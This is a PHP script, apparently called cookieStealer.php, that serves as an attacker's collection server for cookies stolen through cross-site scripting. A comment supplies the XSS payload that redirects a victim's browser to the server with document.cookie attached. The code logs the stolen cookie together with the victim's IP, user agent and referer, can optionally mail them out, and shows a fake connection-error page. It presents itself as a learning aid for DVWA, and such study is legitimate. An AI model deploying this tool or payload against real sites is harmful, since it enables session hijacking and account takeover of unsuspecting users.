<?php 

# Server can easily be started using the command "php -S <IP>:<Port> -t <Path>" Where path points to the directory containing cookieStealer.php 
# An XSS redirection to this server could look like: <script>document.location="http://<IP>:<Port>/?cookie=" + document.cookie;</script>
# Note that this XSS-payload does not hide the redirection in any way.
# This script is only supposed to be used for learning pruposes and can be tested against e.g DVWA (Damn Vulnerable Web Application)

#Functionality to mail grabbed cookies
#Requires further configuration in on server machine
function mailCookie($message)
{ 	
	$subject = "CookieGrabber";
	$recipient = 'example@example.com';
	mail($recipient, $subject, $message); 
}

function writeLog() 
{ 
	#Choose logfile
	$ipLog="./log.txt";
	#Cookie is sent as a QUERY to the php-server 
	$cookie = $_SERVER['QUERY_STRING']; 
	#Check if register_globals is ON, if ON, get REMOTE_ADDR (Default OFF as of PHP 5.3.0)
	$register_globals = (bool) ini_get('register_gobals');

	#Collect information about redirected user 
	if ($register_globals) 
		$ip = getenv('REMOTE_ADDR'); 
	else
		$ip = IP(); 
	
	$rem_port = $_SERVER['REMOTE_PORT'];
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['METHOD']; 
	$rem_host = $_SERVER['REMOTE_HOST']; 
	$referer = $_SERVER['HTTP_REFERER']; 
	$date=date ("Y-m-d H:i:s"); #Date, e.g "2018-01-01 23:29:11". Correct time requires timezone settings in php configuration file.
	$log=fopen("$ipLog", "a"); #Open chosen logfile with in write mode, set filepointer at EOF

	#Create message to mail/log
	$message = "IP: $ip\nPort: $rem_port\nHost: $rem_host\nUser-Agent: $user_agent\nMethod: $rqst_method\nReferer: $referer\nDate: $date\nCookie: $cookie\n\n";

	#Mail redirected user if a cookie is present
	/*
	if (!empty($cookie))
		mailCookie($message);
	*/
	#Write to log
	fputs($log, $message); 
	fclose($log); #Close file descriptor
} 

#Get remote IP if possible
function IP()
{
	#Iterate through possible keys
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) 
    {
        if (array_key_exists($key, $_SERVER) === true) #Iterate for key in SERVER
        {
            foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip) #If key exist explode into array and trim whitespace, iterate for valid IP
            {
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) #If the IP is valid, return it
                {
                    return $ip;
                }
            }
        }
    }
} 

writeLog();

#If redirection back to legitimate site is impossible, an example bogus site is shown
echo ' <p style="text-align:center;"><img src="connectionError.png" alt="Connection Lost" class="center"> '

?>

